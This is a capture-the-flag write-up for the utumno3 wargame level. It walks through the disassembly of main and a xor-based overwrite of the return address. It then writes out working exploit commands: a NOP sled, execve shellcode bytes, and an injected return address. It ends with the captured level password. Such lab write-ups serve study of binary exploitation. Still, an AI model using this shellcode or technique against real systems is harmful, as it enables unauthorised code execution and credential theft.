ebp = 0xffffd6d8
return address of main is stored in ebp + 4 (by stackoverflow)

disas main:
```assembly
   0x080483eb <+0>:	push   ebp
   0x080483ec <+1>:	mov    ebp,esp
   0x080483ee <+3>:	push   ebx
   0x080483ef <+4>:	sub    esp,0x38
   0x080483f2 <+7>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080483f9 <+14>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080483fc <+17>:	mov    DWORD PTR [ebp-0x8],eax
   0x080483ff <+20>:	jmp    0x804844d <main+98>
   0x08048401 <+22>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048404 <+25>:	mov    ecx,eax
   0x08048406 <+27>:	lea    edx,[ebp-0x3c]
   0x08048409 <+30>:	mov    eax,DWORD PTR [ebp-0x8]
   0x0804840c <+33>:	add    eax,edx
   0x0804840e <+35>:	mov    BYTE PTR [eax],cl
   0x08048410 <+37>:	lea    edx,[ebp-0x3c]
   0x08048413 <+40>:	mov    eax,DWORD PTR [ebp-0x8]
   0x08048416 <+43>:	add    eax,edx
   0x08048418 <+45>:	movzx  ecx,BYTE PTR [eax]
   0x0804841b <+48>:	mov    eax,DWORD PTR [ebp-0x8]
   0x0804841e <+51>:	mov    edx,eax
   0x08048420 <+53>:	mov    eax,edx
   0x08048422 <+55>:	add    eax,eax
   0x08048424 <+57>:	add    eax,edx
   0x08048426 <+59>:	xor    ecx,eax
   0x08048428 <+61>:	lea    edx,[ebp-0x3c]
   0x0804842b <+64>:	mov    eax,DWORD PTR [ebp-0x8]
   0x0804842e <+67>:	add    eax,edx
   0x08048430 <+69>:	mov    BYTE PTR [eax],cl
   0x08048432 <+71>:	lea    edx,[ebp-0x3c]
   0x08048435 <+74>:	mov    eax,DWORD PTR [ebp-0x8]
   0x08048438 <+77>:	add    eax,edx
   0x0804843a <+79>:	movzx  eax,BYTE PTR [eax]
   0x0804843d <+82>:	movsx  ebx,al
   0x08048440 <+85>:	call   0x80482c0 <getchar@plt>
   0x08048445 <+90>:	mov    BYTE PTR [ebp+ebx*1-0x24],al	# we write the second char at some location ebp-0x24+ebx
   0x08048449 <+94>:	add    DWORD PTR [ebp-0x8],0x1		#ebx is hard to calculate, we also have xor in the code
   0x0804844d <+98>:	call   0x80482c0 <getchar@plt>
   0x08048452 <+103>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048455 <+106>:	cmp    DWORD PTR [ebp-0xc],0xffffffff
   0x08048459 <+110>:	je     0x8048461 <main+118>
   0x0804845b <+112>:	cmp    DWORD PTR [ebp-0x8],0x17		#some cmp, jump lower equal to exit from main loop
   0x0804845f <+116>:	jle    0x8048401 <main+22>
   0x08048461 <+118>:	mov    eax,0x0
   0x08048466 <+123>:	add    esp,0x38
   0x08048469 <+126>:	pop    ebx
   0x0804846a <+127>:	pop    ebp
   0x0804846b <+128>:	ret
```
note the line:
0x08048426 <+59>:	xor    %eax,%ecx
we see that each round, something gets xor'ed --> as encryption
eax has our byte from getchar(), and ecx changes somehow each round
so each round we'll try some plain char, get the cipher, and calculate what char we need
note that xor is the inverse of itself --> p xor k = c, p xor c = k

so we try:
at first byte "\x28\x41" -->  becomes "\x28\x41"                                   xor key is 0
at second byte "\x2a\x41" --> becomes "\x29\x41"    (0x29 --> 0x2a, 0x2a --> 0x29) xor key is 3
at third byte "\x2c\x41" --> becomes "\x2a\x41"     (0x2d --> 0x2b)                xor key is 6
at fourth byte "\x22\x41" --> becomes "\x22\x41"    (0x2f --> 0x26, 0x2e --> 0x27) xor key is 9

we get: run <<< $(python -c 'print "\x28\x41\x2a\x41\x2c\x41\x22\x41"')

as usual, we try to shellcode by env variables

we insert 
we find the address: 0xffffd87a

at last:
./utumno3 $(python -c 'print "\x90"*50+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"') <<< $(python -c 'print "\x28\x85\x2a\xd8\x2c\xff\x22\xff"')

shellcode:	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

doesnt work

shellcode of cat /etc/utumno_pass/utumno4:	\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80

works

we get:

oogieleoga



